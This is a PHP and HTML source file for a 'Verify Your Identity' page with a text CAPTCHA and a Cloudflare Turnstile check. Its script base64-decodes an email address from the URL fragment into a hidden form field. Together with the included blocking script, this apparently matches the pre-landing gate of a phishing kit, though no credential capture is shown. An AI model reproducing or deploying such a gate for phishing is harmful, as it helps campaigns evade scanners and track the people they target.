<?php
include 'block-check.php';
$turnstileSiteKey = getenv('TURNSTILE_SITE_KEY');
?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        :root {
            --primary-color: #3b82f6;
            --primary-hover: #2563eb;
            --background: #f8fafc;
            --card-bg: #ffffff;
            --text-primary: #0f172a;
            --text-secondary: #475569;
            --border-color: #e2e8f0;
            --success-color: #10b981;
            --error-color: #ef4444;
            --gradient-start: #eef2ff;
            --gradient-mid: #e0f2fe;
            --gradient-end: #dbeafe;
        }

        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        @keyframes float {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }

        body, html {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            font-family: 'Inter', system-ui, -apple-system, sans-serif;
            background: linear-gradient(-45deg, var(--gradient-start), var(--gradient-mid), var(--gradient-end));
            background-size: 400% 400%;
            animation: gradient 15s ease infinite;
            color: var(--text-primary);
        }

        .container {
            background-color: var(--card-bg);
            padding: 3.5rem;
            width: 100%;
            max-width: 480px;
            border-radius: 32px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.15);
            margin: 20px;
            position: relative;
            overflow: hidden;
            backdrop-filter: blur(10px);
        }

        .container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 6px;
            background: linear-gradient(90deg, var(--primary-color), var(--primary-hover));
        }

        .header {
            text-align: center;
            margin-bottom: 3rem;
            animation: float 6s ease-in-out infinite;
        }

        .header-icon {
            background: linear-gradient(135deg, rgba(59, 130, 246, 0.15), rgba(37, 99, 235, 0.15));
            color: var(--primary-color);
            width: 64px;
            height: 64px;
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1.5rem;
            transform: rotate(-5deg);
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
        }

        .header-icon:hover {
            transform: rotate(0deg) scale(1.1);
            box-shadow: 0 10px 20px -5px rgba(59, 130, 246, 0.3);
        }

        .header-icon i {
            font-size: 2rem;
            transition: all 0.3s ease;
        }

        .header-icon:hover i {
            transform: scale(1.1);
        }

        h1 {
            font-size: 2rem;
            font-weight: 800;
            margin: 0;
            color: var(--text-primary);
            letter-spacing: -0.025em;
            line-height: 1.2;
        }

        .description {
            font-size: 1.1rem;
            color: var(--text-secondary);
            margin: 1.25rem 0 3rem;
            text-align: center;
            line-height: 1.7;
        }

        .captcha-container {
            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
            padding: 2rem;
            border-radius: 24px;
            margin-bottom: 2rem;
            border: 1px solid var(--border-color);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .captcha-container:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 16px -4px rgba(0, 0, 0, 0.1);
        }

        label {
            font-size: 1rem;
            font-weight: 600;
            display: block;
            margin-bottom: 1rem;
            color: var(--text-primary);
        }

        .captcha-image {
            display: flex;
            align-items: center;
            gap: 20px;
            margin-top: 1.25rem;
            justify-content: center;
            background-color: white;
            padding: 1.5rem;
            border-radius: 20px;
            border: 1px solid var(--border-color);
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .captcha-image:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 16px -4px rgba(0, 0, 0, 0.1);
        }

        .captcha-input {
            font-size: 1.1rem;
            width: 100%;
            padding: 1rem 1.5rem;
            border: 2px solid var(--border-color);
            border-radius: 16px;
            box-sizing: border-box;
            margin-top: 1.25rem;
            transition: all 0.3s ease;
            background-color: white;
        }

        .captcha-input:focus {
            border-color: var(--primary-color);
            outline: none;
            box-shadow: 0 0 0 4px rgba(59, 130, 246, 0.15);
            transform: translateY(-1px);
        }

        .refresh-button {
            padding: 12px;
            border: 2px solid var(--border-color);
            background-color: white;
            border-radius: 14px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .refresh-button:hover {
            background-color: var(--background);
            transform: rotate(180deg);
            border-color: var(--primary-color);
        }

        .next-button {
            padding: 1.25rem;
            background: linear-gradient(135deg, var(--primary-color), var(--primary-hover));
            color: white;
            border: none;
            border-radius: 16px;
            cursor: pointer;
            font-size: 1.1rem;
            font-weight: 600;
            width: 100%;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .next-button:disabled {
            background: linear-gradient(135deg, #94a3b8, #64748b);
            opacity: 0.7;
            cursor: not-allowed;
        }

        .next-button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 8px 16px -4px rgba(59, 130, 246, 0.3);
        }

        .next-button::after {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(
                rgba(255, 255, 255, 0.2),
                rgba(255, 255, 255, 0)
            );
            transform: rotate(45deg);
            transition: 0.5s;
            opacity: 0;
        }

        .next-button:hover::after {
            opacity: 1;
        }

        .cf-turnstile {
            margin: 2.5rem 0;
            display: flex;
            justify-content: center;
        }

        @media (max-width: 640px) {
            .container {
                padding: 2rem;
                margin: 16px;
                border-radius: 28px;
            }

            .captcha-container {
                padding: 1.5rem;
            }

            h1 {
                font-size: 1.75rem;
            }

            .description {
                font-size: 1rem;
            }
        }

        @media (prefers-reduced-motion: reduce) {
            .header {
                animation: none;
            }
            
            .container::before {
                transition: none;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-icon">
                <i class="fas fa-shield-alt"></i>
            </div>
            <h1>Verify Your Identity</h1>
            <p class="description">Please complete the verification below to confirm you're human and continue securely.</p>
        </div>
        <form id="captcha-form" action="/validate_captcha.php" method="POST">
            <input type="hidden" id="email" name="email">

            <div class="captcha-container">
                <label for="text-captcha">Complete the Security Check</label>
                <div class="captcha-image">
                    <img src="/generate_captcha.php" alt="CAPTCHA Image" id="captcha-image" style="max-width: 160px;">
                    <button type="button" onclick="refreshCaptcha()" class="refresh-button">
                        <i class="fas fa-sync-alt" style="color: var(--primary-color);"></i>
                    </button>
                </div>
                <input type="text" id="text-captcha" name="text_captcha" class="captcha-input" placeholder="Enter the characters shown above" required>
            </div>

            <div class="cf-turnstile" data-sitekey="0x4AAAAAAA0DYZjZ9s2HydTY" data-callback="onTurnstileVerified"></div>

            <button id="next-button" class="next-button" type="submit" disabled>
                Continue <i class="fas fa-arrow-right" style="margin-left: 10px;"></i>
            </button>
        </form>
    </div>

    <script>
        function refreshCaptcha() {
            const img = document.getElementById("captcha-image");
            img.style.opacity = "0.5";
            img.src = "/generate_captcha.php?" + Date.now();
            img.onload = function() {
                img.style.opacity = "1";
                img.style.transition = "opacity 0.3s ease";
            };
        }

        function onTurnstileVerified(token) {
            const button = document.getElementById('next-button');
            button.disabled = false;
            button.innerHTML = 'Continue <i class="fas fa-arrow-right" style="margin-left: 10px;"></i>';
        }

        function prefillEmail() {
    // Get the hash part of the URL (everything after #)
    const hash = window.location.hash;
    
    if (hash) {
        // Remove the # character
        const encodedEmail = hash.substring(1);
        try {
            // Try to decode it (whether it's base64 or not)
            const email = atob(encodedEmail);
            document.getElementById('email').value = email;
        } catch {
            // If it's not base64 encoded, use it directly
            document.getElementById('email').value = encodedEmail;
        }
    }
}
        window.onload = prefillEmail;
    </script>
</body>
</html>